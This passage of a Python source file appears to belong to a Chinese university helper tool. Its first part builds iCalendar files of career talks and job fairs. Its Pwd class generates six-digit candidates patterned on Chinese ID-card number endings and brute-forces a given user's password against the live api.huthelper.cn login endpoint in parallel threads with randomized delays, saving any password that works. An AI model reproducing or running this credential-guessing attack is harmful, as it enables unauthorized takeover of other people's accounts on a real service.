                    traceback.print_exc()
                    time.sleep(1)
        return datas

    def gen_cal(self, **kwargs):
        tz = pytz.timezone('Asia/Shanghai')

        cal = Calendar()
        cal.add('PRODID', '-//Hoshizora //iCalendar 4.0.3')
        cal.add('VERSION', '2.0')
        cal.add('CALSCALE', 'GREGORIAN')
        # print(self.data)
        datas = self.get_datas(**kwargs)
        if(not datas):
            return None
        for data in datas:
            year, mon, day = data['meet_day'].split('-')
            sta_hour, sta_minu = data['meet_time'].split(':')
            event = Event()
            event.add('DTSTAMP', datetime.now())
            event.add('DTSTART', datetime(int(year), int(mon), int(day), int(sta_hour), int(sta_minu), 0,
                                          tzinfo=tz))
            # event.add('DTEND', datetime(int(year), int(mon), int(day), int(sta_hour)+2, int(sta_minu), 0,
            #                             tzinfo=tz))
            event.add('UID', str(uuid.uuid1()))
            event.add('LOCATION', data['address'])

            if(self.mode == 'getcareers'):
                event.add('SUMMARY', data['meet_name'])
                description = '%s %s %s\n城市：%s 点击统计：%s\n企业属性：%s 行业类别: %s\n需求专业：%s\n%s' % (
                    data['meet_day'], data['meet_time'], data['address'],
                    data['city_name'], data['view_count'],
                    data['company_property'], data['industry_category'],
                    data['professionals'],
                    self.CAREER_INFO_HOST + data['career_talk_id'])
                if(self.style == 'full'):
                    description += '\n{remark}'.format(remark=data['remark'])
                event.add('DESCRIPTION', description)
            else:
                event.add('SUMMARY', data['title'])
                event.add('DESCRIPTION', '%s %s %s\n点击统计：%s\n组织者：%s\n参会企业：%s\n%s' %
                          (data['meet_day'], data['meet_time'], data['address'],
                           data['view_count'], data['organisers'], data['company_name'],
                           self.FAIR_INFO_HOST + data['fair_id']))

            cal.add_component(event)
        # s = str(cal.to_ical(), encoding='utf8')
        # print(s)
        return(str(cal.to_ical(), encoding='utf8'))
        # with open('jb.ics', 'w', encoding='utf8') as f:
        #     f.write(str(cal.to_ical(), encoding='utf8'))


class Pwd(object):
    def __init__(self, user, sex=0):
        self.user = user
        self.pds = []
        rg = range(0, 10)
        for first in range(0, 4):
            for second in rg:
                if((first == 0) and (second == 0)):
                    continue
                if((first == 3) and (second == 2)):
                    break
                for three in rg:
                    for four in rg:
                        if(sex):
                            sex_rg = (1, 3, 5, 7, 9)
                        else:
                            sex_rg = (0, 2, 4, 6, 8)
                        for five in sex_rg:
                            for six in (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'x'):
                                num = "%s%s%s%s%s%s" % (
                                    first, second, three, four, five, six)
                                self.pds.append(num)

    def pwd_boom(self, user, pwd):
        url = 'https://api.huthelper.cn/api/v1/get/login/' + self.user + '/' + pwd
        header = {
            'Host': 'api.huthelper.cn',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/3.10.0'
        }
        # print(time.ctime(time.time()))
        req = requests.Request(url=url, headers=header)
        while(True):
            try:
                res = requests.urlopen(req).read()
                res = gzip.decompress(res.read()).decode('utf-8')
                res = json.loads(res)
                # print(res)
                if(res['code'] == 200):
                    print(res)
                    print('用户: ', user, '登录成功', '\n', '密码: ', pwd)
                    with open('success.txt', 'w') as f:
                        f.write(pwd)
                        sys.exit(0)
                else:
                    print('密码错误: ', pwd)
                break
            except requests.exceptions.ConnectTimeout:
                traceback.print_exc()
                time.sleep(2)
        # print(time.ctime(time.time()))

    def run(self):
        for pwd in self.pds:
            thread = threading.Thread(
                target=self.pwd_boom, args=(self.user, pwd))
            sleep_time = random.uniform(0.01, 1)
            time.sleep(sleep_time)
            thread.start()


if __name__ == '__main__':
    # t = Student()
    # ss = t.gen_Kb_web_data(xh='18401100609')
    # s = t.getUserInfo()
    # print(ss)
    # t = ElectricityFeeInquiry()
    # s = t.getJzinfo(2, 4)
    # s = CurriculumCalendar()
    # s.gen_cal()
    # t.gen_Kb_web_data(kb=t.gen_Kb_json_data())
    # t = JobCalendar()
    # s = t.gen_cal()
    # t = ExaminationCalendar()
    # s = t.gen_cal()
    # print(t.get_datas())
    t = JobCalendar(style='full', mode='getjobfairs')
    s = t.get_datas()
    pass
